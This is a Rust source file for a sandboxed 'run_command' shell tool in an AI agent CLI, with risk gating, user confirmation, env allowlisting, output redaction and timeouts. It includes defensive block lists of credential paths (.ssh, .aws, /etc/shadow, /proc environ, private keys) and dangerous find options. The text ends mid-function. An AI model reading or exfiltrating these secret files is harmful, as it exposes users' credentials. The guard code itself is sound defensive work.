//! `run_command` SRE 도구 (RFC-002 Phase 2 MVP).
//!
//! `aic chat`에서 **기본 활성**으로 노출된다(`--no-run`/`--read-only`/`AIC_AGENT_NO_RUN`로
//! 끔). 정책(MVP, 고정):
//! - `risk_guard::classify` 결과 **Safe** → 자동 실행.
//! - **NeedsConfirm** → TTY confirm 필수(non-TTY는 거부).
//! - **Dangerous / Unknown** → 실행하지 않고 차단 사유를 결과로 반환.
//!
//! 실행은 `sh -c`로 하되 cwd는 sandbox root(또는 root 하위의 허용된 cwd)로 제한하고,
//! child env는 최소 allowlist만 넘긴다(API key/token류 차단). stdout/stderr는
//! 64 KiB로 cap하고 LLM 전달 전 `redaction::redact`를 적용한다. timeout hard cap 30s.

use std::io::Read;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use serde_json::{json, Value};

use super::sandbox::Sandbox;
use super::tools::ToolError;
use super::types::ToolSpec;

/// timeout 기본값(초).
const DEFAULT_TIMEOUT_SECS: u64 = 15;
/// timeout hard cap(초).
const MAX_TIMEOUT_SECS: u64 = 30;
/// stdout/stderr 각각의 최대 저장 바이트(이후 truncate).
const MAX_STREAM_BYTES: usize = 64 * 1024;
/// reader가 cap 이후 드레인할 최대 바이트(초과 시 reader 종료 → join hang 방지).
const MAX_DRAIN_BYTES: usize = 8 * 1024 * 1024;
/// 자식 종료(또는 timeout kill) 후 reader 스레드 완료를 기다리는 최대 시간.
/// process group kill로 lingering descendant가 정리되면 EOF가 곧 오지만, 무기한 join을
/// 막기 위한 hard watchdog. 초과 시 join을 포기하고 공유버퍼의 부분 출력을 스냅샷한다.
const DRAIN_GRACE: Duration = Duration::from_secs(2);
/// 셸 제약(검증 실패) 시 사용자/모델에게 줄 actionable 안내.
const SHELL_RESTRICTION_HINT: &str = "셸 특수문자($, glob `* ? [ ] { }`, 따옴표, 백슬래시, \
redirect `> <`, `;`, `&`, `&&`/`||`, backtick)는 차단됩니다. 파이프 `|`는 허용되되 각 segment의 \
argv가 개별 검증됩니다. 단순 argv(+`| head`)로 다시 시도하거나, 패턴 검색은 grep/glob 도구를 \
사용하세요. 예: `grep -n ERROR app.log` 또는 `ps aux | head -n 20`.";
/// child에 넘길 환경변수 allowlist. 그 외(특히 API key/token)는 전달하지 않는다.
const ENV_ALLOWLIST: [&str; 9] = [
    "PATH",
    "HOME",
    "LANG",
    "LC_ALL",
    "TERM",
    "KUBECONFIG",
    "AWS_PROFILE",
    "AWS_REGION",
    "AWS_DEFAULT_REGION",
];

/// LLM에 노출할 `run_command` 도구 스펙.
pub fn spec() -> ToolSpec {
    ToolSpec {
        name: "run_command",
        description: "셸 명령을 sandbox(cwd) 안에서 실행한다(SRE 진단용). 위험 명령은 정책으로 \
                      차단되거나 사용자 확인을 요구한다. **bounded-output 명령을 선호하라** — \
                      큰 출력은 항상 head/sort/limit로 줄인다. 기본 진단 예시: processes/cpu => \
                      `ps aux | head -n 20`, disk => `df -h`, memory => `free -h`(Linux)/\
                      `ps aux | head -n 20`(macOS), network => `ss -tunl | head -n 50`(Linux)/\
                      `netstat -an | head -n 50`(macOS), logs => `tail -n 100 <file>` 또는 \
                      `journalctl --no-pager -n 100`. shell 특수문자($, 글롭, 따옴표, 백슬래시, \
                      redirect, ;, &)는 차단되므로 단순 argv + pipe 형태만 쓴다.",
        parameters: json!({
            "type": "object",
            "properties": {
                "command": { "type": "string", "description": "실행할 셸 명령" },
                "timeout_secs": { "type": "integer", "description": "최대 실행 시간(초, 기본 15, 상한 30)" },
                "cwd": { "type": "string", "description": "cwd(현재 작업 디렉터리 기준 상대 경로, sandbox 내)" }
            },
            "required": ["command"]
        }),
    }
}

/// `run_command`를 정책에 따라 실행한다.
///
/// `confirm(command, cwd_display, reason)`은 NeedsConfirm일 때만 호출된다.
/// 차단/거부/타임아웃/실행 결과는 모두 `Ok(String)`(LLM 회신용 텍스트)으로,
/// 인자/cwd 오류만 `Err(ToolError)`로 반환한다.
pub fn execute(
    args: &Value,
    sandbox: &Sandbox,
    confirm: impl FnOnce(&str, &str, &str) -> bool,
) -> Result<String, ToolError> {
    execute_with_corr(args, sandbox, "-", confirm)
}

/// [`execute`]에 correlation id(`corr`)를 더한 변형 — card/audit/debug에서 같은 id로
/// tool_call ↔ tool_result ↔ run_command 실행을 추적할 수 있게 한다.
pub fn execute_with_corr(
    args: &Value,
    sandbox: &Sandbox,
    corr: &str,
    confirm: impl FnOnce(&str, &str, &str) -> bool,
) -> Result<String, ToolError> {
    let raw_command = args
        .get("command")
        .and_then(|v| v.as_str())
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .ok_or_else(|| ToolError::new("필수 인자 'command'가 없거나 비어 있음"))?;

    // SRE shortcut normalize — 단순 의도(ps/cpu/disk/mem/net)는 안전한 bounded
    // canonical 명령으로 변환해 되묻기 없이 바로 실행한다(validator·Safe 통과만 생성).
    let normalized = normalize_sre_command(raw_command);
    let command: &str = normalized.as_deref().unwrap_or(raw_command);

    let timeout = resolve_timeout(args);
    let (cwd, cwd_display) = resolve_cwd(args, sandbox)?;

    // 위험도 분류 → MVP 정책.
    let assessment = crate::risk_guard::classify(command);
    let reason = assessment
        .reason
        .clone()
        .unwrap_or_else(|| "위험도 분류".to_string());

    use crate::risk_guard::RiskLevel;
    let policy_label = match assessment.level {
        RiskLevel::Safe => "Safe(auto)",
        RiskLevel::NeedsConfirm => "NeedsConfirm(confirm)",
        RiskLevel::Dangerous => "Dangerous(blocked)",
        RiskLevel::Unknown => "Unknown(blocked)",
    };
    // command card / provenance — 사용자에게 무엇이 어떤 정책으로 실행/차단되는지 보여준다.
    print_command_card(command, &cwd_display, policy_label, timeout, corr);

    match assessment.level {
        RiskLevel::Dangerous | RiskLevel::Unknown => {
            audit(
                "run_command_blocked",
                command,
                &cwd_display,
                corr,
                &assessment,
            );
            eprintln!(
                "{} {}",
                paint("▌", "31"),
                paint(&format!("→ blocked ({reason})"), "31")
            );
            Ok(format!(
                "[blocked] 위험 등급 {:?}로 차단됨: {reason}\ncommand: {}\n\
                 다음 행동: 상태를 바꾸지 않는 읽기 전용 진단(예: ps/df -h/grep/cat)을 제안하거나, \
                 read_file/list_dir/grep/glob 도구로 대체하세요.",
                assessment.level,
                redact_line(command)
            ))
        }
        RiskLevel::NeedsConfirm => {
            if confirm(command, &cwd_display, &reason) {
                audit(
                    "run_command_confirmed",
                    command,
                    &cwd_display,
                    corr,
                    &assessment,
                );
                run_and_format(command, &cwd, &cwd_display, timeout, sandbox, corr)
            } else {
                audit(
                    "run_command_denied",
                    command,
                    &cwd_display,
                    corr,
                    &assessment,
                );
                eprintln!(
                    "{} {}",
                    paint("▌", "33"),
                    paint("→ denied (사용자 거부 또는 비-TTY)", "33")
                );
                Ok(format!(
                    "[denied] 사용자 확인이 거부되었거나 비대화형(TTY 아님) 환경이라 실행하지 않았습니다.\n\
                     command: {}\n다음 행동: 더 안전한 읽기 전용 대안을 제안하거나, 사용자에게 \
                     의도를 확인하세요.",
                    redact_line(command)
                ))
            }
        }
        RiskLevel::Safe => {
            audit("run_command_auto", command, &cwd_display, corr, &assessment);
            run_and_format(command, &cwd, &cwd_display, timeout, sandbox, corr)
        }
    }
}

/// ANSI 코드로 감싼다(NO_COLOR/non-TTY면 원문 — UI 색상 정책과 일관).
fn paint(s: &str, code: &str) -> String {
    if crate::agent::ui::color_enabled() {
        format!("\x1b[{code}m{s}\x1b[0m")
    } else {
        s.to_string()
    }
}

/// command card 한 줄(`▌` bar + dim 본문) — status line과 시각적으로 일관.
fn card_line(body: &str) {
    eprintln!("{} {}", paint("▌", "2"), paint(body, "2"));
}

/// 순수 결정 로직(테스트용): 상세 카드 표시 여부.
fn detail_cards_from(debug: bool, verbose: bool) -> bool {
    debug || verbose
}

/// 상세 command card(실행 preamble + `→ done` 요약)를 보일지. **기본 OFF(조용한 /local UX)**,
/// `AIC_DEBUG` 또는 `AIC_VERBOSE`가 `1|true`면 ON. blocked/denied/NeedsConfirm 등 **보안 경고는
/// 이 flag와 무관하게 항상 표시**한다.
fn detail_cards_enabled() -> bool {
    detail_cards_from(
        crate::agent::debug::env_truthy("AIC_DEBUG"),
        crate::agent::debug::env_truthy("AIC_VERBOSE"),
    )
}

/// 실행/차단 직전 사용자에게 보여줄 command card(provenance)를 stderr에 출력한다.
/// 기본 모드에서는 조용히(생략) — AIC_DEBUG/AIC_VERBOSE일 때만 상세 preamble을 보인다.
fn print_command_card(command: &str, cwd: &str, policy_label: &str, timeout: Duration, corr: &str) {
    if !detail_cards_enabled() {
        return;
    }
    eprintln!(
        "{} {} {} {}",
        paint("▌", "2"),
        paint("run_command", "1"),
        paint(&format!("[{corr}]"), "2"),
        redact_line(command)
    );
    card_line(&format!(
        "cwd: {cwd} · policy: {policy_label} · timeout: {}s · output cap: {} KB",
        timeout.as_secs(),
        MAX_STREAM_BYTES / 1024
    ));
}

/// timeout_secs 인자를 [1, MAX] 범위로 정규화한다.
fn resolve_timeout(args: &Value) -> Duration {
    let secs = args
        .get("timeout_secs")
        .and_then(|v| v.as_u64())
        .unwrap_or(DEFAULT_TIMEOUT_SECS)
        .clamp(1, MAX_TIMEOUT_SECS);
    Duration::from_secs(secs)
}

/// 단순 SRE 의도 키워드를 안전한 bounded canonical 명령으로 변환한다.
///
/// validator(단순 argv + pipe)와 `risk_guard` Safe를 통과하는 명령만 생성한다.
/// `ps`/`ps aux` 같은 큰 출력은 `| head`로 자동 축약한다. 해당 없으면 None
/// (원래 명령을 그대로 사용). `logs`는 파일/플랫폼 의존이라 normalizer가 아닌
/// SRE preface 지침으로 안내한다.
fn normalize_sre_command(command: &str) -> Option<String> {
    let key = command.trim().to_lowercase();
    let canonical = match key.as_str() {
        "ps" | "process" | "processes" | "cpu" | "ps aux" | "ps -ef" => "ps aux | head -n 20",
        "disk" | "df" => "df -h",
        "mem" | "memory" => {
            if cfg!(target_os = "linux") {
                "free -h"
            } else {
                "ps aux | head -n 20"
            }
        }
        "net" | "network" => {
            if cfg!(target_os = "linux") {
                "ss -tunl | head -n 50"
            } else {
                "netstat -an | head -n 50"
            }
        }
        _ => return None,
    };
    Some(canonical.to_string())
}

/// cwd 인자를 sandbox 안의 디렉터리로 해석한다(없으면 root).
/// 반환: (절대 cwd, root 기준 표시 문자열).
fn resolve_cwd(args: &Value, sandbox: &Sandbox) -> Result<(PathBuf, String), ToolError> {
    match args.get("cwd").and_then(|v| v.as_str()) {
        Some(c) if !c.trim().is_empty() => {
            let resolved = sandbox.resolve(c)?; // sandbox 밖이면 거부
            if !resolved.is_dir() {
                return Err(ToolError::new(format!("cwd가 디렉터리가 아님: {c}")));
            }
            let display = sandbox
                .relative(&resolved)
                .unwrap_or_else(|| ".".to_string());
            Ok((resolved, display))
        }
        _ => Ok((sandbox.root().to_path_buf(), ".".to_string())),
    }
}

/// 명령을 실행하고 LLM 회신용 결과 문자열을 만든다.
/// 실행 전 `validate_command`로 sandbox 탈출/메타문자를 차단한다.
fn run_and_format(
    command: &str,
    cwd: &Path,
    cwd_display: &str,
    timeout: Duration,
    sandbox: &Sandbox,
    corr: &str,
) -> Result<String, ToolError> {
    // 실행 전 엄격 검증(샌드박스 강제). 위반 시 실행하지 않고 차단 결과 반환.
    if let Err(reason) = validate_command(command, sandbox) {
        let _ = crate::audit::append(
            "run_command_blocked_validation",
            json!({ "corr": corr, "command": redact_line(command), "cwd": cwd_display, "reason": reason }),
        );
        eprintln!(
            "{} {}",
            paint("▌", "31"),
            paint(&format!("→ blocked: {reason}"), "31")
        );
        card_line(SHELL_RESTRICTION_HINT);
        return Ok(format!(
            "[blocked] 명령 검증 실패: {reason}\ncommand: {}\n다음 행동: {}",
            redact_line(command),
            SHELL_RESTRICTION_HINT
        ));
    }

    let start = Instant::now();
    let outcome = spawn_with_timeout(command, cwd, timeout)?;
    let duration_ms = start.elapsed().as_millis();
    let truncated_any = outcome.stdout_truncated || outcome.stderr_truncated;
    // 실행 완료 요약 — 상세 카드(AIC_DEBUG/AIC_VERBOSE)일 때만. 기본은 조용히.
    if detail_cards_enabled() {
        card_line(&format!(
            "→ done exit={} duration={duration_ms}ms truncated={truncated_any}",
            outcome
                .exit_code
                .map(|c| c.to_string())
                .unwrap_or_else(|| "timeout".into()),
        ));
    }

    let (out_red, _) = prep_stream(&outcome.stdout);
    let (err_red, _) = prep_stream(&outcome.stderr);
    let truncated = outcome.stdout_truncated || outcome.stderr_truncated;

    let exit_repr = match outcome.exit_code {
        Some(code) => code.to_string(),
        None => "timeout".to_string(),
    };

    let mut result = format!(
        "command: {}\nexit_code={exit_repr} duration_ms={duration_ms} truncated={truncated} cwd={cwd_display}",
        redact_line(command)
    );
    if outcome.timed_out {
        result.push_str(&format!("\n[timeout] {}s 초과로 중단됨", timeout.as_secs()));
    }
    if outcome.drain_timed_out {
        result.push_str("\n[hint] output drain timed out; showing partial output");
    }
    if truncated {
        result.push_str(
            "\n[hint] output was truncated; rerun with a narrower command (e.g. add `| head -n N` or grep).",
        );
    }
    result.push_str("\n--- stdout ---\n");
    result.push_str(&out_red);
    result.push_str("\n--- stderr ---\n");
    result.push_str(&err_red);
    Ok(result)
}

struct Outcome {
    stdout: Vec<u8>,
    stderr: Vec<u8>,
    stdout_truncated: bool,
    stderr_truncated: bool,
    exit_code: Option<i32>,
    timed_out: bool,
    /// reader 스레드가 grace 내에 끝나지 않아 부분 출력만 스냅샷한 경우(드물게).
    drain_timed_out: bool,
}

/// pipe에서 **bounded**로 읽어 공유버퍼에 누적한다: 최대 `MAX_STREAM_BYTES`까지만 저장하고,
/// 그 이후는 `MAX_DRAIN_BYTES`까지만 드레인한 뒤 종료한다(`read_to_end` 금지 →
/// unbounded allocation·무한 join 방지). 청크마다 공유버퍼에 즉시 반영하므로, 호출 측이
/// reader join을 포기하더라도 그 시점까지의 **부분 출력 스냅샷**을 회수할 수 있다.
fn bounded_read_into(stream: &mut impl Read, buf: &Mutex<Vec<u8>>, truncated: &AtomicBool) {
    let mut chunk = [0u8; 8192];
    let mut total = 0usize;
    loop {
        match stream.read(&mut chunk) {
            Ok(0) => break, // EOF
            Ok(n) => {
                total += n;
                {
                    let mut b = buf.lock().unwrap_or_else(|e| e.into_inner());
                    if b.len() < MAX_STREAM_BYTES {
                        let room = MAX_STREAM_BYTES - b.len();
                        let take = n.min(room);
                        b.extend_from_slice(&chunk[..take]);
                        if take < n {
                            truncated.store(true, Ordering::SeqCst);
                        }
                    } else {
                        truncated.store(true, Ordering::SeqCst);
                    }
                }
                // 드레인 상한 초과 시 종료(grandchild가 pipe를 잡고 있어도 reader가 끝남).
                if total >= MAX_DRAIN_BYTES {
                    truncated.store(true, Ordering::SeqCst);
                    break;
                }
            }
            Err(ref e) if e.kind() == std::io::ErrorKind::Interrupted => continue,
            Err(_) => break,
        }
    }
}

/// child를 새 process group의 leader로 만든다(Unix). timeout 시 group 전체를 kill해
/// descendant(예: `cmd | other`, `-exec` 등)까지 함께 종료하기 위함이다.
#[cfg(unix)]
fn configure_process_group(cmd: &mut Command) {
    use std::os::unix::process::CommandExt;
    // SAFETY: pre_exec는 fork 후 exec 전 자식에서 실행된다. setpgid(0,0)는
    // async-signal-safe하며 자식을 자신의 pgid로 설정한다(부작용 없음).
    unsafe {
        cmd.pre_exec(|| {
            if libc::setpgid(0, 0) != 0 {
                return Err(std::io::Error::last_os_error());
            }
            Ok(())
        });
    }
}

#[cfg(not(unix))]
fn configure_process_group(_cmd: &mut Command) {}

/// timeout 시 child(및 descendant)를 강제 종료한다.
/// Unix: process group 전체에 SIGKILL → pipe를 잡은 grandchild까지 죽어 reader가 EOF로 끝남.
#[cfg(unix)]
fn kill_process_tree(child: &mut std::process::Child) {
    let pid = child.id() as i32;
    // 음수 pid = process group 전체. setpgid(0,0)로 child가 group leader(pgid==pid).
    unsafe {
        libc::kill(-pid, libc::SIGKILL);
        // 보조: leader 단독에도 한 번(그룹 설정 실패 등 대비).
        libc::kill(pid, libc::SIGKILL);
    }
    let _ = child.wait();
}

#[cfg(not(unix))]
fn kill_process_tree(child: &mut std::process::Child) {
    let _ = child.kill();
    let _ = child.wait();
}

/// 공통 cleanup: process group 전체에 SIGKILL을 보내 **정상 종료 후에도** pipe write-end를
/// 잡고 남은 descendant(예: 백그라운드 자식)를 정리한다 → reader가 EOF를 받아 join이 끝난다.
/// leader가 이미 reaped이거나 그룹이 비어 있으면 ESRCH로 무해하다.
#[cfg(unix)]
fn reap_descendants(pgid: i32) {
    // 음수 pid = process group 전체. setpgid(0,0)로 leader의 pgid == leader pid.
    unsafe {
        libc::kill(-pgid, libc::SIGKILL);
    }
}

#[cfg(not(unix))]
fn reap_descendants(_pgid: i32) {}

/// `sh -c <command>`를 실행하고 timeout 내 완료를 기다린다.
/// stdout/stderr는 별도 스레드로 **bounded** 드레인해 pipe deadlock·unbounded alloc을 피한다.
/// timeout 시 process group 전체를 kill해 descendant까지 정리한다(hard wall-clock cap).
fn spawn_with_timeout(command: &str, cwd: &Path, timeout: Duration) -> Result<Outcome, ToolError> {
    let mut cmd = Command::new("sh");
    cmd.arg("-c")
        .arg(command)
        .current_dir(cwd)
        .env_clear()
        .envs(allowed_env())
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    configure_process_group(&mut cmd);
    let mut child = cmd
        .spawn()
        .map_err(|e| ToolError::new(format!("명령 실행 실패: {e}")))?;
    // setpgid(0,0)로 child가 group leader이므로 pgid == child pid.
    let pgid = child.id() as i32;

    // 공유버퍼: reader가 청크마다 누적 → join을 포기해도 부분 출력 스냅샷 가능.
    let mut out = child.stdout.take();
    let mut err = child.stderr.take();
    let out_buf = Arc::new(Mutex::new(Vec::<u8>::new()));
    let out_trunc = Arc::new(AtomicBool::new(false));
    let out_done = Arc::new(AtomicBool::new(false));
    let err_buf = Arc::new(Mutex::new(Vec::<u8>::new()));
    let err_trunc = Arc::new(AtomicBool::new(false));
    let err_done = Arc::new(AtomicBool::new(false));
    let out_handle = std::thread::spawn({
        let (buf, trunc, done) = (
            Arc::clone(&out_buf),
            Arc::clone(&out_trunc),
            Arc::clone(&out_done),
        );
        move || {
            if let Some(s) = out.as_mut() {
                bounded_read_into(s, &buf, &trunc);
            }
            done.store(true, Ordering::SeqCst);
        }
    });
    let err_handle = std::thread::spawn({
        let (buf, trunc, done) = (
            Arc::clone(&err_buf),
            Arc::clone(&err_trunc),
            Arc::clone(&err_done),
        );
        move || {
            if let Some(s) = err.as_mut() {
                bounded_read_into(s, &buf, &trunc);
            }
            done.store(true, Ordering::SeqCst);
        }
    });

    let start = Instant::now();
    let mut timed_out = false;
    let exit_code = loop {
        match child.try_wait() {
            Ok(Some(status)) => break status.code(),
            Ok(None) => {
                if start.elapsed() >= timeout {
                    // process group 전체 SIGKILL → descendant까지 종료, pipe close 보장.
                    kill_process_tree(&mut child);
                    timed_out = true;
                    break None;
                }
                std::thread::sleep(Duration::from_millis(20));
            }
            Err(e) => return Err(ToolError::new(format!("프로세스 대기 실패: {e}"))),
        }
    };

    // 공통 cleanup: 정상 종료라도 pipe write-end를 잡은 lingering descendant를 process group
    // SIGKILL로 정리한다 → reader가 EOF로 끝난다(nested-PTY hang 방지). timeout 경로에서는
    // 이미 kill되었지만 빈 그룹 재-kill은 무해하다.
    reap_descendants(pgid);

    // reader join watchdog: 위 kill 후 reader는 곧 끝나지만, 무기한 join을 막기 위해
    // DRAIN_GRACE까지만 done 플래그를 기다린다. 초과 시 join을 포기하고(스레드는 detach)
    // 공유버퍼에서 부분 출력을 스냅샷한다(Rust는 스레드 강제 종료가 불가).
    let deadline = Instant::now() + DRAIN_GRACE;
    while !(out_done.load(Ordering::SeqCst) && err_done.load(Ordering::SeqCst)) {
        if Instant::now() >= deadline {
            break;
        }
        std::thread::sleep(Duration::from_millis(10));
    }
    let drain_timed_out = !(out_done.load(Ordering::SeqCst) && err_done.load(Ordering::SeqCst));
    if !drain_timed_out {
        let _ = out_handle.join();
        let _ = err_handle.join();
    }

    // 공유버퍼 스냅샷(join 여부와 무관하게 그 시점까지의 출력을 회수). 락 poison은 무시.
    let stdout = out_buf.lock().unwrap_or_else(|e| e.into_inner()).clone();
    let stderr = err_buf.lock().unwrap_or_else(|e| e.into_inner()).clone();
    let stdout_truncated = out_trunc.load(Ordering::SeqCst);
    let stderr_truncated = err_trunc.load(Ordering::SeqCst);

    Ok(Outcome {
        stdout,
        stderr,
        stdout_truncated,
        stderr_truncated,
        exit_code,
        timed_out,
        drain_timed_out,
    })
}

/// 현재 env에서 allowlist에 있는 변수만 (key, value)로 수집한다.
fn allowed_env() -> Vec<(String, String)> {
    ENV_ALLOWLIST
        .iter()
        .filter_map(|k| std::env::var(*k).ok().map(|v| ((*k).to_string(), v)))
        .collect()
}

/// 바이트 스트림을 텍스트로 변환·cap·redact한다. 반환: (처리된 텍스트, truncated 여부).
fn prep_stream(bytes: &[u8]) -> (String, bool) {
    let truncated = bytes.len() > MAX_STREAM_BYTES;
    let slice = &bytes[..bytes.len().min(MAX_STREAM_BYTES)];
    let text = String::from_utf8_lossy(slice);
    let (red, _report) = crate::redaction::redact(&text);
    (red, truncated)
}

/// 한 줄(명령 echo 등)에 redaction 적용.
fn redact_line(s: &str) -> String {
    crate::redaction::redact(s).0
}

/// 실행/차단/거부 결과를 audit에 best-effort로 남긴다(실패는 무시).
fn audit(kind: &str, command: &str, cwd: &str, corr: &str, a: &crate::risk_guard::RiskAssessment) {
    let _ = crate::audit::append(
        kind,
        json!({
            "corr": corr,
            "command": redact_line(command),
            "cwd": cwd,
            "risk_level": format!("{:?}", a.level),
            "rule": a.rule,
        }),
    );
}

// ── 명령 검증 (샌드박스 강제) ──────────────────────────────────

/// 명령 head의 인자(path) 처리 정책.
// 변형 이름의 공통 접미사 `Paths`는 의도된 의미(인자=path 여부)이므로 lint 억제.
#[allow(clippy::enum_variant_names)]
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum PathArgPolicy {
    /// path 인자 없음(관찰 명령: ps, df, uptime, echo 등).
    NoPaths,
    /// 모든 non-option 인자가 path(cat, head, tail, ls, du, stat, file, wc 등).
    AllPaths,
    /// 첫 non-option은 pattern, 이후 non-option이 path(grep, rg 등).
    PatternThenPaths,
    /// 첫 option 이전의 non-option만 path(find, fd).
    LeadingPaths,
}

/// 토큰이 옵션처럼 보이는지(`-l`, `--sort=-%cpu` 등).
fn is_option(tok: &str) -> bool {
    tok.starts_with('-')
}

/// 명령 head의 basename으로 path 인자 정책을 결정한다.
fn path_policy(head: &str) -> PathArgPolicy {
    let name = head.rsplit('/').next().unwrap_or(head);
    match name {
        "cat" | "head" | "tail" | "ls" | "ll" | "la" | "du" | "stat" | "file" | "wc" | "less"
        | "more" | "tree" | "cmp" | "diff" | "locate" | "readlink" | "realpath" | "nl" | "od"
        | "hexdump" | "xxd" => PathArgPolicy::AllPaths,
        "grep" | "egrep" | "fgrep" | "rg" | "ag" => PathArgPolicy::PatternThenPaths,
        "find" | "fd" => PathArgPolicy::LeadingPaths,
        // 알 수 없는 head는 path 인자가 없다고 보되, 전역 절대경로/traversal 차단은 적용된다.
        _ => PathArgPolicy::NoPaths,
    }
}

/// 인자 토큰의 절대경로/traversal 탈출을 차단한다(옵션은 호출 전 제외).
/// mutation/위험 명령(NeedsConfirm 등급)에만 적용한다 — read-only 진단은 전역 read를 허용한다.
fn check_no_escape(tok: &str) -> Result<(), String> {
    if tok.starts_with('/') {
        return Err(format!("절대 경로 인자 불가: {tok}"));
    }
    if tok.split('/').any(|c| c == "..") {
        return Err(format!("경로 traversal(..) 불가: {tok}"));
    }
    Ok(())
}

/// read-only 진단이 호스트 전역을 읽더라도 **차단할 민감 경로**인지(secret/credential).
/// 경로 컴포넌트·파일명 기준으로 판정한다(절대·상대 무관). egress·mutation은 risk_guard가
/// 별도 게이트하고, 출력은 redaction을 거치지만, secret 파일은 읽기 자체를 막는다.
fn is_sensitive_path_str(path: &str) -> bool {
    let lower = path.to_lowercase();
    let comps: Vec<&str> = lower.split('/').filter(|c| !c.is_empty()).collect();
    // 민감 디렉토리(홈 하위 credential 저장소). 컴포넌트 단위라 `/var/lib/docker`(점 없음)와
    // `~/.docker`(`.docker`)는 구분된다.
    const SENSITIVE_DIR_COMPONENTS: &[&str] = &[
        ".ssh",
        ".aws",
        ".gnupg",
        ".gpg",
        ".kube",
        ".docker",
        "gcloud",
        ".password-store",
        ".gem",
    ];
    if comps
        .iter()
        .any(|c| SENSITIVE_DIR_COMPONENTS.contains(c))
    {
        return true;
    }
    // 시스템 secret 파일/디렉토리.
    for prefix in ["/etc/shadow", "/etc/gshadow", "/etc/sudoers", "/etc/ssl/private"] {
        if lower == prefix || lower.starts_with(&format!("{prefix}/")) {
            return true;
        }
    }
    // /proc/<pid>/environ — 프로세스 환경변수(secret 가능).
    if comps.first() == Some(&"proc") && comps.last() == Some(&"environ") {
        return true;
    }
    // 파일명/확장자 기반(.env, credentials, *.pem, id_rsa ...) — tools::is_secret_file 재사용.
    if let Some(name) = lower.rsplit('/').next() {
        if super::tools::is_secret_file(name) {
            return true;
        }
    }
    false
}

/// read-only 진단 명령의 path 인자가 민감 경로면 차단한다. 경로 문자열 + (존재 시)
/// canonicalize 대상까지 검사해 symlink/traversal 우회(`/tmp/x -> ~/.ssh/id_rsa`)를 best-effort 방어한다.
fn check_sensitive_path(tok: &str) -> Result<(), String> {
    if is_sensitive_path_str(tok) {
        return Err(format!("민감 경로 접근 차단: {tok}"));
    }
    if let Ok(canon) = std::fs::canonicalize(tok) {
        if is_sensitive_path_str(&canon.to_string_lossy()) {
            return Err(format!("민감 경로(symlink 대상) 접근 차단: {tok}"));
        }
    }
    Ok(())
}

/// find/fd에서 무조건 차단할 위험 옵션(subprocess 실행·삭제·제어·파일쓰기).
/// 이들이 있으면 Safe라도 실행하지 않는다(우회 방지).
const FIND_DANGEROUS_OPTS: [&str; 11] = [
    "-exec", "-execdir", "-ok", "-okdir", "-delete", "-quit", "-fprintf", "-fprint", "-fprint0",
    "-fls", "-prune",
];

/// path 인자를 sandbox 안에서 resolve한다(존재 + root containment, symlink 해소).
fn resolve_in_sandbox(tok: &str, sandbox: &Sandbox) -> Result<(), String> {
    sandbox
        .resolve(tok)
        .map(|_| ())
        .map_err(|e| format!("sandbox 밖이거나 존재하지 않는 경로: {tok} ({})", e.message))
}

/// `opt`가 **별도 토큰**으로 값을 소비하는 옵션인지(명령별). 첨부형(`-n20`,`--lines=20`)은 false.
/// `head -n 20`의 `20`을 path로 오판하지 않게 한다.
fn consumes_next_value(cmd: &str, opt: &str) -> bool {
    if opt.contains('=') || !opt.starts_with('-') {
        return false;
    }
    match cmd {
        "head" | "tail" | "nl" => matches!(opt, "-n" | "-c" | "--lines" | "--bytes"),
        "grep" | "egrep" | "fgrep" | "rg" | "ag" => matches!(
            opt,
            "-A" | "-B"
                | "-C"
                | "-m"
                | "-e"
                | "--regexp"
                | "--max-count"
                | "--context"
                | "--after-context"
                | "--before-context"
        ),
        "find" | "fd" => matches!(
            opt,
            "-name"
                | "-iname"
                | "-path"
                | "-ipath"
                | "-maxdepth"
                | "-mindepth"
                | "-type"
                | "-size"
                | "-newer"
                | "-mtime"
                | "-ctime"
                | "-atime"
                | "-perm"
                | "-regex"
        ),
        _ => false,
    }
}

/// 정책에 따라 path로 간주되는 인자에 `on_path`를 적용한다(옵션 arity·pattern 제외 처리 공유).
/// 옵션 값 토큰은 `consumes_next_value`로 건너뛰고, PatternThenPaths의 첫 non-option(pattern)은 제외한다.
fn for_each_path_arg(
    cmd: &str,
    policy: PathArgPolicy,
    args: &[&str],
    mut on_path: impl FnMut(&str) -> Result<(), String>,
) -> Result<(), String> {
    if policy == PathArgPolicy::NoPaths {
        return Ok(());
    }
    let mut seen_pattern = false;
    let mut i = 0;
    while i < args.len() {
        let tok = args[i];
        if is_option(tok) {
            // LeadingPaths(find/fd): 첫 option부터 expression → path 검증 종료.
            if policy == PathArgPolicy::LeadingPaths {
                break;
            }
            // 값 소비 옵션이면 다음 토큰(값)을 건너뛴다.
            if consumes_next_value(cmd, tok) {
                i += 2;
            } else {
                i += 1;
            }
            continue;
        }
        // non-option 토큰.
        if policy == PathArgPolicy::PatternThenPaths && !seen_pattern {
            seen_pattern = true; // 첫 non-option = pattern → skip
            i += 1;
            continue;
        }
        on_path(tok)?;
        i += 1;
    }
    Ok(())
}

/// (mutation/위험 명령용) path 인자를 sandbox.resolve로 검증한다 — root 내 존재 + containment.
fn validate_path_args(
    cmd: &str,
    policy: PathArgPolicy,
    args: &[&str],
    sandbox: &Sandbox,
) -> Result<(), String> {
    for_each_path_arg(cmd, policy, args, |tok| resolve_in_sandbox(tok, sandbox))
}

/// 단일 pipe segment(`cmd args...`)를 검증한다.
/// `read_only`면(전체 명령이 risk_guard Safe) 호스트 전역 read를 허용하고 secret 경로만 차단한다.
/// 아니면(mutation/위험) 기존대로 절대경로/traversal 차단 + sandbox(cwd) containment를 강제한다.
fn validate_segment(segment: &str, sandbox: &Sandbox, read_only: bool) -> Result<(), String> {
    let tokens: Vec<&str> = segment.split_whitespace().collect();
    let head = tokens.first().ok_or_else(|| "빈 명령".to_string())?;
    let args = &tokens[1..];
    let name = head.rsplit('/').next().unwrap_or(head);

    // find/fd: subprocess/삭제/제어/파일쓰기 옵션은 무조건 차단(read_only 무관, Safe 우회 방지).
    if matches!(name, "find" | "fd") {
        for tok in args {
            if FIND_DANGEROUS_OPTS.contains(tok) {
                return Err(format!("find/fd 위험 옵션 차단: {tok}"));
            }
        }
    }

    if read_only {
        // read-only 진단: 호스트 전역 read 허용 — secret 경로만 차단(SRE 목적).
